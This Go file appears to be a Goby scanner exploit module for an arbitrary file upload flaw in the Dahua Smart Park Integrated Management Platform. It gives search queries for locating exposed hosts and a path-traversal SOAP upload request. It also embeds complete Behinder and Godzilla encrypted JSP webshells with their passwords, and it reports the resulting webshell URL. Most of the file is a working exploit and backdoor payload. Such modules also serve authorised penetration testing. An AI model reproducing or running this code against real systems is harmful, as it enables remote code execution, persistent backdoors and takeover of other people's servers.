package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dahua Smart Park Integrated Management Platform poi file upload vulnerability",
    "Description": "<p>Dahua Smart Park Integrated Management Platform is a comprehensive management solution developed by Dahua Technology Co., Ltd. (Dahua Technology). The platform is designed to help park managers improve management efficiency, improve safety levels, optimize resource utilization, and achieve intelligent park operations.</p><p>Dahua Smart Park Integrated Management Platform has an arbitrary file upload vulnerability in the poi path. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "dahua-Smart-Park-GMP",
    "Homepage": "https://www.dahuatech.com/product/info/5609.html",
    "DisclosureDate": "2023-08-20",
    "PostTime": "2023-11-17",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "body=\"/WPMS/asset/lib/json2.js\" || body=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" || (cert=\"Dahua\" && cert=\"DSS\") || header=\"Path=/WPMS\" || banner=\"Path=/WPMS\"",
    "GobyQuery": "body=\"/WPMS/asset/lib/json2.js\" || body=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" || (cert=\"Dahua\" && cert=\"DSS\") || header=\"Path=/WPMS\" || banner=\"Path=/WPMS\"",
    "Level": "3",
    "Impact": "<p>An attacker can use this vulnerability to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://www.dahuatech.com/product/info/5609.html\">https://www.dahuatech.com/product/info/5609.html</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "aabss.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "大华智慧园区综合管理平台 poi 文件上传漏洞",
            "Product": "dahua-智慧园区综合管理平台",
            "Description": "<p>大华智慧园区综合管理平台是由大华技术股份有限公司(Dahua Technology)开发的一款综合管理解决方案。该平台旨在帮助园区管理者提高管理效率、提升安全水平、优化资源利用,并实现智能化的园区运营。<br></p><p>大华智慧园区综合管理平台在 poi 路径处存在任意文件上传漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.dahuatech.com/product/info/5609.html\">https://www.dahuatech.com/product/info/5609.html</a><br><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Dahua Smart Park Integrated Management Platform poi file upload vulnerability",
            "Product": "dahua-Smart-Park-GMP",
            "Description": "<p>Dahua Smart Park Integrated Management Platform is a comprehensive management solution developed by Dahua Technology Co., Ltd. (Dahua Technology). The platform is designed to help park managers improve management efficiency, improve safety levels, optimize resource utilization, and achieve intelligent park operations.</p><p>Dahua Smart Park Integrated Management Platform has an arbitrary file upload vulnerability in the poi path. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://www.dahuatech.com/product/info/5609.html\">https://www.dahuatech.com/product/info/5609.html</a><br></p>",
            "Impact": "<p>An attacker can use this vulnerability to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10872"
}`
	base64EncodesdY39G3nFR := func(input string) string {
		inputBytes := []byte(input)
		encodedString := base64.StdEncoding.EncodeToString(inputBytes)
		return encodedString
	}
	sendPayloadsdY39G3nFR := func(hostInfo *httpclient.FixUrl, filename, payload string) (*httpclient.HttpResponse, error) {
		payloadConfig := httpclient.NewPostRequestConfig("/emap/webservice/gis/soap/poi")
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		payloadConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		payloadConfig.Data = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\n<soapenv:Header/>\n   <soapenv:Body>\n<res:uploadPicFile>\n<!--type: string-->\n         <arg0>/../../" + filename + "</arg0>\n<!--type: base64Binary-->\n<arg1>" + base64EncodesdY39G3nFR(payload) + "</arg1></res:uploadPicFile>\n    </soapenv:Body>\n    </soapenv:Envelope>\n"
		return httpclient.DoHttpRequest(hostInfo, payloadConfig)
	}
	checkFileY39G3nFR := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		checkConfig := httpclient.NewGetRequestConfig("/upload/" + filename)
		checkConfig.VerifyTls = false
		checkConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			filename := goutils.RandomHexString(6) + ".jsp"
			randStr := goutils.RandomHexString(10)
			payload := "<% out.println(\"" + randStr + "\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>"
			resp, _ := sendPayloadsdY39G3nFR(hostInfo, filename, payload)
			if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "<soap:Envelope xmlns:soap=") && strings.Contains(resp.Utf8Html, "<code>1</code>") {
				check, _ := checkFileY39G3nFR(hostInfo, filename)
				return check != nil && check.StatusCode == 200 && strings.Contains(check.Utf8Html, randStr)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			content := goutils.B2S(stepLogs.Params["content"])
			filename := goutils.RandomHexString(6) + ".jsp"
			if attackType == "behinder" {
				content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
			} else if attackType == "godzilla" {
				content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
			} else if attackType == "custom" {
				filename = goutils.B2S(stepLogs.Params["filename"])
				content = goutils.B2S(stepLogs.Params["content"])
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			resp, err := sendPayloadsdY39G3nFR(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Output = err.Error()
			} else if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "<soap:Envelope xmlns:soap=") && strings.Contains(resp.Utf8Html, "<code>1</code>") {
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/upload/" + filename
				if attackType == "godzilla" {
					expResult.Output += "\nPassword: pass 密钥：key 加密器：JAVA_AES_BASE64"
					expResult.Output += "\nWebShell tool: Godzilla v4.1"
				} else if attackType == "behinder" {
					expResult.Output += "\nPassword: rebeyond"
					expResult.Output += "\nWebShell tool: Behinder v3.0"
				}
				expResult.Output += "\nWebshell type: jsp"
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}